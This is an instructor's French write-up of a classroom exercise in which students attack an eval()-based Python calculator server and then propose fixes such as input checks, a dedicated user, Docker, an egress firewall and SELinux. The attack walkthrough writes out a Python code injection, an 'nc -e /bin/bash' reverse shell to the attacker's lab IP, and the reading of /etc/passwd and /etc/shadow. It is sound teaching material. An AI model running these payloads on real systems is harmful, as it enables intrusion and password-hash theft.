# Rem√©diations Calculatrice

Dans tout le doc, j'utilise les termes :

- **pour vous** :
  - "d√©vs" pour la partie d√©v de la promo
  - "s√©cu" pour la partie s√©cu
  - "admins" pour ceux qui ont choisi syst√®me/r√©seau (j'aime pas "infra" dans ce contexte)
- **pour le code** :
  - [`server.py`](./server.py) est la feuille de code qui permet de lancer le serveur calculatrice
  - [`client.py`](./client.py) est la feuille de code qui permet de lancer un client calculatrice qui se co au serveur
- **pour les adresses IP** :
  - `10.1.1.100` : le serveur qui h√©berge la calculatrice
  - `10.1.1.17` : l'IP de la machine qui attaque

---

**Le I.** est une lecture rapide : quelques mots sur le contexte de l'exo.

**Le II.** est plut√¥t long et vous explique la d√©marche du hacker du d√©but √† la fin.

**Le III.** est long et constitue une compilation des rem√©diations propos√©es par les s√©cu et certaines par moi (il y a une section d√©v et une section sys/r√©seau).

**Le IV.** est une lecture rapide : un r√©cap des rem√©diations, dans des grandes lignes, un peu les conseils √† garder de l'exercice pour chacun d'entre vous.

## Sommaire

- [Rem√©diations Calculatrice](#rem√©diations-calculatrice)
  - [Sommaire](#sommaire)
- [I. Contexte complet de l'exercice](#i-contexte-complet-de-lexercice)
- [II. D√©marche des s√©cu](#ii-d√©marche-des-s√©cu)
  - [1. D√©couverte client](#1-d√©couverte-client)
  - [2. Contact avec un serveur](#2-contact-avec-un-serveur)
  - [3. POC](#3-poc)
  - [4. Exploit](#4-exploit)
  - [5. Post-exploit](#5-post-exploit)
  - [6. Bilan final](#6-bilan-final)
- [III. Rem√©diations](#iii-rem√©diations)
  - [1. D√©v](#1-d√©v)
    - [A. Client](#a-client)
      - [a. NTUI](#a-ntui)
      - [b. Compilation](#b-compilation)
    - [B. Serveur](#b-serveur)
      - [a. NTUI](#a-ntui-1)
      - [b. Encodage maison](#b-encodage-maison)
  - [2. Syst√®me et r√©seau](#2-syst√®me-et-r√©seau)
    - [A. Client](#a-client-1)
    - [B. Serveur](#b-serveur-1)
      - [a. Le user](#a-le-user)
      - [b. Conteneur](#b-conteneur)
      - [c. Firewall](#c-firewall)
      - [d. SELinux](#d-selinux)
- [IV. Le fin mot de l'histoire](#iv-le-fin-mot-de-lhistoire)
  - [1. D√©vs](#1-d√©vs)
  - [2. Admins](#2-admins)
  - [3. S√©cu](#3-s√©cu)

# I. Contexte complet de l'exercice

Ce que j'avais imagin√© et qu'on a r√©ussi √† mener √† peu pr√®s dans des bonnes conditions :

- **les d√©vs d√©veloppent une app vuln√©rable**
  - un vilain `eval()`
  - et l'argument de `eval()` c'est une entr√©e utilisateur
- **les admins l'h√©bergent au sein du r√©seau de l'√©cole**
  - je leur donne
    - `server.py` √† h√©berger
    - `client.py` pour tester que √ßa marche bien
    - c'est les admins : ils ont tout, les d√©vs leur font confiance √† priori
  - dans une VM, et on se d√©merde pour que la VM soit joignable sur le r√©seau
  - (interface bridge ou forwardind NAT avec VBox, pour ceux que √ßa int√©resse)
  - autour de cette app, ils ont fait du monitoring, du packaging √©tou
- **les s√©cu p√®tent l'app**
  - comme dans une situation r√©elle, je leur donne que `client.py`
  - √† la fin, ils deviennent `root` sur la machine qui h√©berge

# II. D√©marche des s√©cu

Je vous fais la d√©marche id√©ale pour p√©ter l'application. Dans les faits, tu passes beaucoup de temps √† faire des trucs qui m√®nent √† rien.

La d√©marche d√©crite en dessous c'est ce que tu pr√©sentes √† la fin, mais c'est 5% de ton travail souvent.

**La d√©couverte d'une information crucial, une information cl√©, sera indiqu√©e par l'emoji üîë**

## 1. D√©couverte client

Tiens un `client.py`. Comme son nom l'indique √ßa doit √™tre un client.

Ca a l'air d'√™tre du Python, j'suis un s√©cu, j'suis parano, j'vais lire le code avant de l'ex√©cuter.

üîë **On dirait un client r√©seau TCP assez simple**

Il parle √† un serveur dont l'IP et le port sont pr√©cis√©s en dur dans le code.

L'IP est une IP priv√©e, donc bon √ßa doit pas marcher si on le lance comme √ßa le client, cette IP priv√©e √ßa devait √™tre une VM ou un conteneur qu'utilisait le d√©v pour faire ses machins.

En revanche le port, c'est `13337/tcp` et √ßa doit √™tre le port qui est utilis√© pour se connecter √† ce genre de serveurs.

üîë **On apprend le port sur lequel √©coute le serveur.**

> *On peut aussi lancer le `client.py` √† l'aveugle, avec Wireshark d'ouvert en m√™me temps, et voir qu'il essaie de se co √† IP:port si on a la flemme de lire le code. Si on fait √ßa, on ex√©cute le code dans une VM bien s√ªr, certainement pas sur notre PC en direct. Disons que l√† c'est Python c'est pas compil√©, alors t'as le code. Mais si c'est compil√©...*

‚ûú *Dans le TP des s√©cu, j'indique clairement que l'app est h√©berg√©e en ce moment-m√™me (pendant qu'ils font leur TP) au sein du r√©seau de l'√©cole.*

Si l'app est h√©berg√©e au sein du r√©seau de l'√©cole, on va vite le savoir, viens l√† copain `nmap`.

On va demander √† `nmap` de tester une connexion sur le port `13337/tcp` de toutes les machines du r√©seau.

üîë **Avec un scan r√©seau `nmap` on apprend les adresses IP des serveurs qui font tourner l'app.**

Dans la suite de ce doc, on suppose que l'IP trouv√©e est `10.1.1.100`.

Bon bah y'a plus qu'√† test.

## 2. Contact avec un serveur

On modifie `client.py` pour qu'il se connecte √† une des adresses IP d√©couvertes avec le scan.

On saisit une op√©ration arithm√©tique, le serveur nous renvoie le r√©sultat.

üîë **On apprend d√©finitivement la fonction du serveur : un serveur calculatrice donc.**

Le client fait un contr√¥le sur la saisie de l'utilisateur pour v√©rifier que c'est une op√©ration arithm√©tique.

Le contr√¥le de saisie est plut√¥t correct, mais il est chiant pour nous hackers, donc on l'enl√®ve de la feuille de code.

En fait, on va m√™me pas utiliser le client tellement c'est une connexion TCP simpliste, utilisons directement `nc` comme client !

```bash
> nc 10.1.1.100 13337
2+2
4
>
```

üîë **`nc` works !**

Cool, on s'emb√™te plus avec `client.py`, on le contourne, on le *bypass*, on en a tir√© tout ce qu'il y avait √† savoir.

Avec un peu de chance, y'a moins ou pas de contr√¥le du tout sur le serveur sur ce qu'on lui envoie.

Parce que de toute fa√ßon, comment il fait le serveur pour ex√©cuter cette op√©ration arithm√©tique ?

Ca sent le `eval()` √ßa... si c'est le cas on peut lui filer du code arbitraire Python.

Et s'il y a pas trop de contr√¥le, √ßa devrait passer ?

## 3. POC

> *POC* c'est pour *Proof of Concept*. Tu prouves que ton truc marche. On pourrait en faire plein de trucs, mais l√†, d√©j√†, juste √ßa marche et √ßa prouve qu'on pourrait faire plus.

Essayons d'envoyer du code python plut√¥t qu'une op√©ration arithm√©tique.

On va pas faire dans la dentelle hein, si on peut faire ex√©cuter du Python au serveur, on va lui demander de faire un truc qui nous prouvera √† coup s√ªr que √ßa fonctionne : qu'il a ex√©cut√© du code Python qu'on lui a envoy√©.

Par exemple... on va essayer de faire ex√©cuter au serveur un bout de code qui `ping` ma machine. Je lance wireshark, j'injecte mon code, et si √ßa fonctionne, je devrais recevoir des `ping`. Nan ?

```bash
> nc 10.1.1.100 13337
__import__("os").system("ping -c 4 10.1.1.17")
```

Avec Wireshark, on re√ßoit bien les 4 pings !

üîë **Ok√® h√©h√©, on a de l'injection de code.**

## 4. Exploit

Une fois qu'on a de l'injection, on sait qu'une belle route se dessine devant nous.

Bon d√©j√†, c'est chiant de devoir faire une connexion `nc` pour taper chaque commande. Puis comment je fais pour avoir le retour des commandes ? La merde.

S'il y a injection, y'a fort √† parier qu'on peut ex√©cuter un *reverse shell* et ainsi avoir (presque) un vrai shell sur la machine plut√¥t que lancer `nc` pour ex√©cuter une commande, et ne pas avoir le r√©sultat.

Let's go, essayons d'injecter un reverse shell :

- **√©tape 1** : lancer un ptit `nc` en √©coute sur une machine qu'on contr√¥le

```bash
# sur la machine de l'attaquant
$ nc -lvp 9999
```

- **√©tape 2** : injecter le reverse shell sur le serveur

```bash
# on se co au serveur avec nc et on injecte le reverse shell
# l'id√©e : on lance un shell (bash) et on "accroche" l'entr√©e et la sortie √† une session TCP
# concr√®tement : le serveur se co √† l'attaquant et lui propose un shell
> nc 10.1.1.100 13337
__import__("os").system("nc -e /bin/bash 10.1.1.17 9999")
```

- **√©tape 3** : retourner sur le `nc` en listen

```bash
# sur la machine de l'attaquant
$ nc -lvp 9999

# on a un shell sur le serveur ici
whoami
root
```

üîë **Ok j'ai un shell sur la machine qui h√©berge l'app**

## 5. Post-exploit

Maintenant qu'on a un shell, baladons-nous...

```bash
whoami
root
# mouahaha int√©ressant, on est root

# bon bah d√©j√†, on commence par voler...
## la liste des users et leurs infos
cat /etc/passwd
[...]

## les hashes des passwords des users
cat /etc/shadow
[...]

# et on se balade un peu
cat /etc/os-release
ps -ef
df -h
ls /
systemctl list-services --all
...

# on aimerait bien trouver le code du serveur
# plein de fa√ßons d'y arriver... en bourrin, en supposant que c'est du Python aussi
find / -name *.py
[...]
/opt/calculatrice/server.py

# on vole aussi le code du serveur
cat /opt/calculatrice/server.py
```

üîë **Confirmation de la pr√©sence d'un `eval()` sans contr√¥le dans le code `server.py`**

## 6. Bilan final

1. Le serveur √©tait vuln√©rable car le code comporte un `eval()` qui est notoirement dangereux.

2. De plus, √† cet `eval()` est directement pass√©e une entr√©e utilisateur, avec un contr√¥le faible c√¥t√© client, et aucun c√¥t√© serveur.

3. Une fois le code inject√©, on se rend compte que l'application est compl√®tement libre sur le syst√®me qui l'h√©berge, et tourne en `root`.

4. La machine n'a pas l'air de pr√©senter de s√©curit√© particuli√®re, buffet √† volont√©.

# III. Rem√©diations

## 1. D√©v

> *Ces recommandations s'addressent particuli√®rement aux d√©vs de la promo : ceux qui ont d√©velopp√© l'app.*

‚ùì La question c'est : **comment √©viter qu'un utilisateur malveillant injecte du code dans notre application ?**

### A. Client

#### a. NTUI

*Never Trust User Input* : ne faites jamais confiance aux entr√©es utilisateurs.

D√®s que tu permets √† ton user de t'envoyer des donn√©es (un champ texte, un upload de fichiers, des requ√™tes HTTP, etc.), pars du principe que tes users **vont** t'envoyer de la merde.

Demande-toi ce qu'il se passe si le user saisit du code plut√¥t qu'une jolie expression arithm√©tique (ou un beau fichier PNG tout √† fait normal).

T'as pas besoin de conna√Ætre 1000 techniques de hack. Pars juste du principe que les hackers sont malins, et qu'ils vont t'envoyer de la merde.

Rem√©diation : c√¥t√© client on contr√¥le **tr√®s fortement** tout ce qu'envoie le client

Le hacker peut toujours contourner, mais c'est relou. Disons que c'est un petit plus.

#### b. Compilation

> *Propos√©e et mise en oeuvre en particulier par Math√©o et Samy. DM moi si je cr√©dite les mauvais gens.*

Il est possible de (pr√©)compiler √† peu pr√®s n'importe quel code dans n'importe quel langage.

Ca emp√™chera pas forc√©ment l'injection de code ici, mais rendra plus difficile la t√¢che du hacker en rendant la lecture du code indirecte et donc difficile.

M√™me avec Python, on peut packager l'application dans un `.exe` et c'parti, √ßa se fait souvent avec `Pyinstaller`.

### B. Serveur

#### a. NTUI

*Never Trust User Input* : ne faites jamais confiance aux entr√©es utilisateurs.

Rem√©diation: c√¥t√© serveur on contr√¥le **tr√®s fortement** tout ce qu'envoie le client

On `eval()` rien si on est pas **s√ªrs** que c'est bien une op√©ration arithm√©tique ici, et pas du code Python arbitraire par exemple.

‚òù **Rem√©diation** : `eval()` est **tr√®s** dangereux, √©vitez-le √† tout prix

Il existe d'autres fonctions que `eval()`, plus complexes, ou d'autres fa√ßons de faire (certains s√©cu ont recod√© l'addition par exemple, mais bon le code devient **tr√®s** difficile √† faire √©voluer).

M'enfin, contr√¥lez de fa√ßon forte les entr√©es utilisateur pour √™tre strictement conforme √† ce que vous attendez, et ce sera ok-tiers.

#### b. Encodage maison

> *Ca c'est recommand√© par moi h√©h√©.*

Si tu fais **un encodage maison**, plut√¥t qu'envoyer des strings du client au serveur, √ßa rend le truc 10x plus opti mais aussi 10x plus secure...

‚ûú **D√©j√†, impossible pour le hacker de se passer de ton client.**

Sauf s'il a vraiment la dalle, et qu'il recode toute ta m√©canique d'encodage/d√©codage maison.

Mais sinon, il est oblig√© d'utiliser ton client. Si en plus de l'encodage, ton client impl√©mente des s√©curit√©s, c'est relou pour lui. C'est ce qui le motivera √† recoder ta m√©canique d'encodage/d√©codage lui-m√™me... mais √ßa ralentit beaucoup. Ne jamais sous-estimer la flemme potentielle des √™tres humains, en particulier des hackers.

‚ûú **Ensuite, c√¥t√© serveur, plut√¥t que de `eval()` une string yolo re√ßue sur le r√©seau**

Si √† la place tu re√ßois octet par octet, en v√©rifiant la taille de chaque nombre, et en v√©rifiant √† chaque nombre re√ßu que c'est bien un nombre apr√®s l'avoir d√©cod√©...

C'est super, super, SUPER strong comme contr√¥le. Tu v√©rifies *au bit pr√®s* que ce qu'on t'envoie est correct.

‚òù **Rem√©diation** : utiliser un encodage maison entre client et le serveur

- **Cons√©quence** :
  - le hacker ne peut plus contourner l'utilisation du client natif
    - s'il le fait c'est au prix de recoder beaucoup de choses lui-m√™me
  - le contr√¥le de donn√©es re√ßues par le serveur est naturellement tr√®s fort
- **Par exemple, dans notre cas** :
  - on peut pas utiliser `nc` directement pour bypass l'utilisation de `client.py`
  - oblig√©s d'utiliser `client.py` ou recoder la logique d'encodage/d√©codage que vous avez invent√©
  - si le serveur v√©rifie au bit pr√®s que ce qui est re√ßu est valable, AVANT d'√©ventuellement `eval()` on est assez safe des injections par l√† (jamais safe √† 100%)

## 2. Syst√®me et r√©seau

> *Ces recommandations s'addressent particuli√®rement aux syst√®me/r√©seau de la promo : ceux qui ont h√©berg√© l'app.*

‚ùì La question c'est : **comment *h√©berger une application vuln√©rable*, avec le moins de *risque* possible ?**

Comment h√©berger une app en ayant la plus petite ***surface d'attaque*** possible ?

### A. Client

Dans le contexte du TP, les admins sys/r√©seau ne g√©raient pas les postes des utilisateurs, des clients.

Est-ce que c'est un gars de la promo qui a achet√© des PCs pour tout le monde ? Et pr√©installer des OS et des outils ?

Nan, pas du tout, on ne g√®re pas du tout la machine des clients.

**Donc aucune recommandation de la part des sys/r√©seau pour le client.**

### B. Serveur

#### a. Le user

‚ûú Si vous suiviez juste mon TP5 les admins, dans le fichier de service `calculatrice.service`, vous ne pr√©cisiez aucun utilisateur.

**Par d√©faut c'est donc `root` qui est utilis√©.**

‚ûú Chaque service **doit** √™tre ex√©cut√© sous l'identit√© d'un utilisateur d√©di√©, cr√©√© expr√®s pour √ßa.

Ainsi, si le service se met √† faire des trucs chelous (bug, hack, autres), il ne pourra faire des trucs chelous que en tant que ce user. Et pas `root`.

On dit que vous r√©duisez la surface d'attaque de la machine.

> *Je dis "service" ici car vous √™tes habitu√©s √† **packager** une application dans un **service** (Linux + systemd) pour la run ensuite comme un service syst√®me. C'est bien, c'est propre. C'est pas toujours le cas. Quoiqu'il arrive, quand tu lances un machin (service ou autres) il faut qu'il s'ex√©cute sous l'identit√© d'un utilisateur d√©di√©, qui a des droits restreints sur la machine.*

‚òù **Rem√©diation** : cr√©er un user d√©di√©, et ex√©cuter `server.py` sous l'identit√© de ce user

- **Cons√©quence** :
  - le hacker quand il fait son injection, il est pas `root`
  - mais un user qui n'a que tr√®s peu de droits
- **Par exemple, dans notre cas** : 
  - il peut toujours voler `server.py` et `/etc/passwd`
  - mais plus `/etc/shadow`

On passe donc d'un service comme √ßa :

```bash
$ cat /etc/systemd/system/calculatrice.service
[Unit]
Description=Super calculatrice r√©seau

[Service]
ExecStart=/bin/python /opt/calculatrice/server.py

[Install]
WantedBy=multi-user.target
```

A au moins √ßa :

```bash
$ sudo useradd calculatrice

$ cat /etc/systemd/system/calculatrice.service
[Unit]
Description=Super calculatrice r√©seau

[Service]
User=calculatrice
ExecStart=/bin/python /opt/calculatrice/server.py

[Install]
WantedBy=multi-user.target
```

> *Il est m√™me possible de configurer le user `calculatrice` avec encore moins de droits (pas de password, pas de homedir, aucun fichier qui lui appartient √† part le `server.py` etc.)*

#### b. Conteneur

> *Propos√©e et mise en oeuvre en particulier par Geoffrey et Doniban. DM moi si je cr√©dite les mauvais gens.*

Je vais √™tre bref car je vais vous donner des cours plus tard sur cette notion.

‚ûú **Plut√¥t que de lancer l'application avec un *service*, il est possible de lancer l'application dans un *conteneur*.**

Voyez le conteneur comme une alternative au *service* (c'est pas une analogie bidon, c'est tr√®s juste et tr√®s proche en r√©alit√©).

Si on lance l'application dans un conteneur, elle sera **isol√©e** du reste de votre syst√®me.

> *Rien √† voir avec une VM. Piti√©. Un service on a dit.*

Par exemple, impossible pour l'application d'acc√©der aux fichiers qui se trouvent sur la machine : elle n'y a juste pas acc√®s.

Impossible pour elle aussi d'utiliser les cartes r√©seau du serveur : un conteneur a ses propres cartes r√©seau.

> *Un conteneur c'est une *sandbox* pour ceux √† qui √ßa parle ce terme, sinon balec, ignore ce commentaire.*

‚òù **Rem√©diation** : ex√©cuter `server.py` dans un conteneur Docker plut√¥t qu'un service

- **Cons√©quence** :
  - quand le hacker fait son injection, il n'a pas acc√®s aux ressources de l'h√¥te
  - pas acc√®s √† ses fichiers, ni ses cartes r√©seau, ni ses users, etc
- **Par exemple, dans notre cas** :
  - il peut toujours voler `server.py` 
  - mais plus `/etc/passwd` ni `/etc/shadow`.

Pour √ßa, on cr√©e un fichier `Dockerfile` :

```Dockerfile
FROM python

COPY server.py /opt/server.py

ENTRYPOINT ["python", "/opt/server.py"]
```

On peut alors transformer ce fichier en une image Docker :

```bash
$ docker build . -t calculatrice
```

Et ensuite run l'application :

```bash
$ docker run -p 13337:13337 calculatrice
```

> *J'suis all√© droit au but, y'a plein de fa√ßons de faire mieux. La suite au prochain √©pisode pendant le cours sur Docker.*

#### c. Firewall

Un firewall √ßa bloque ou laisse passer des connexions qui entrent sur la machine, mais aussi celles qui sortent de la machine.

**Il est r√©current dans la confif du firewall, pour le contr√¥le du trafic en sortie** :

‚ûú **pour des PCs clients (nos PCs √† nous) de laisser open-bar en sortie**

- le firewall ne bloque rien en sortie
- sinon tu pourrais pas aller sur youtube, ou sur rien d'autre en fait
- tu pourrais pas envoyer de paquets sur le r√©seau

‚ûú **pour des serveurs, g√©n√©ralement, on bloque tout**

- √† quel moment un serveur fait une connexion sortante
- pour aller sur youtube ?
- bah jamais √† priori (ou presque)
- ou alors un hacker exfiltre des donn√©es ou mine du bitcoin ouais

‚òù **Rem√©diation** : le firewall de la machine qui h√©berge `server.py` doit √™tre tr√®s restrictif en sortie.

- **Cons√©quence** :
  - le hacker, quand il fait son injection, il ne peut pas faire de connexions vers l'ext√©rieur
- **Par exemple, dans notre cas** :
  - impossible de tester avec `ping` que l'injection fonctionne
  - impossible de cr√©er un reverse shell

> *Ca emp√™che pas l'attaque mais putain qu'elle devient reloue √† mener...*

#### d. SELinux

SELinux est un outil permettant d'augmenter le niveau de s√©curit√© d'une machine Linux. Install√© par d√©faut sur tous les syst√®mes RedHat (Rocky, Fedora, RHEL, etc.).

Souvent on le d√©sactive, je vous l'ai m√™me fait d√©sactiver dans votre patron de VM, comme √ßa il est toujours d√©sactiv√© quand vous clonez.

Mais si on le configure, la s√©cu apport√©e est folle.

Dans notre cas, SELinux emp√™cherait le hacker de :

- **plus possible d'injecter des commandes shell**
  - genre l'injection est l√†
  - mais ce programme Python on lui enl√®ve les droits de lancer d'autres programmes
  - donc impossible de lui faire lancer des commandes shell
  - MAIS on pourrait toujours voler le code √©tou directement en injectant que du Python
  - des ptits `open()` pour lire les fichiers par exemple
- **impossible d'acc√©der √† d'autres fichiers sur le syst√®me**
  - `server.py` il ne peut ouvrir aucun autre fichier
  - c'est tout
  - chut c'est tout, t'ouvres rien
  - m√™me si c'est `root` qui ex√©cute `server.py` : chut t'as pas le droit
- **impossible de faire quoique ce soit en fait**
  - pas d'interaction avec le r√©seau
  - pas d'interaction avec les fichiers
  - impossible de lancer de nouveaux process

‚òù **Rem√©diation** : activer et configurer SELinux

- **Cons√©quence** :
  - m√™me si l'injection est pr√©sente, le hacker reste confin√© au code Python de l'application
- **Par exemple, dans notre cas** :
  - l'injection marche toujours hein, l'app est vuln√©rable toute fa√ßon
  - mais l'injection ne m√®ne plus √† injecter du code sur l'h√¥te
  - on peut juste taper du Python. S√ªrement apprendre quelques trucs sur le code du serveur (et c'est d√©j√† pas cool), mais c'est tr√®s limit√©

# IV. Le fin mot de l'histoire

## 1. D√©vs

‚ûú **NTUI**

- *Never Trust User Input*
- genre never, tes users, y'a des hackers dedans
- la plupart bienveillants, mais pas tous
- **contr√¥lez de mani√®re forte toutes les saisies utilisateur**

‚ûú **`eval()` est extr√™mement dangereux et c'est notoire**

- cette fonction existe dans tous les langages ou presque
- elle est notoirement r√©put√©e pour √™tre dangereuse
- si on lui passe une saisie utilisateur c'est RED FLAG direct
- **√©vitez `eval()` autant que possible**

‚ûú **brouillez les pistes**

- compilation du client, encodage maison, obfuscation du code, etc
- misez sur la flemme du hacker
- cela dit, si le gars est d√©t√©r √ßa sert √† rien (sauf l'encodage, parce qu'on a la perf avec aussi)

> *Si votre code est open-source, bah tout le monde y a acc√®s. Mais tkt, le principe, c'est que 99% des hackers sont avec toi, et juste 1% est contre. Donc ton code open-source va √™tre renforc√© par le 99%.*

## 2. Admins

‚ûú **jamais utiliser `root` pour faire tourner un service**

- utiliser un user d√©di√©
- il doit avoir le moins de droits possible

‚ûú **essayez de confiner les applications qui tournent**

- conteneur, SELinux, autres
- on confine l'app dans un environnement isol√©
- on l'emp√™che d'acc√©der aux ressources de l'h√¥te (fichiers, r√©seau, users, etc.)

‚ûú **le firewall, piti√©**

- le firewall c'est ton premier rempart pour ce qui est du r√©seau
- **il est tellement efficace**, en ajoutant juste quelques lignes de conf...
- ne le n√©gligez pas, jamais, toutes les machines ont un firewall, il **FAUT** le conf
- y'a pas d'exceptions, jamais. Tu conf le firewall c'tout.
- **de la mani√®re la plus restrictive possible** : par exemple ici, pas de trafic sortant pour un serveur

## 3. S√©cu

üåº **Vous aurez le droit de faire les malins si vous pliez tous les TPs d√©v et sys/r√©seau avant de parler.** üåº
